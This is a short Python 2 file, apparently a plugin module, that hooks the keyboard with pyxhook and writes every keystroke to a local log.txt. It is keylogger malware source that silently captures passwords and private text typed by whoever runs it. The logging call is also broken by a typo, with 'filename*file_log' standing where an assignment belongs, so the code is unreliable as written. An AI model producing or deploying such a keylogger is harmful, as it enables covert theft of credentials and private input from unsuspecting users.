import pyxhook, sys, logging
def run(**args):
  try:
      file_log='log.txt'
      def kbevent(event):
         logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s')
         chr(event.Ascii)
         logging.log(10,chr(event.Ascii))
         return True
      hookman = pyxhook.HookManager()
      hookman.KeyDown = kbevent
      hookman.HookKeyboard()
      hookman.start()
  except Exception, e:
      return str(e)
  
  
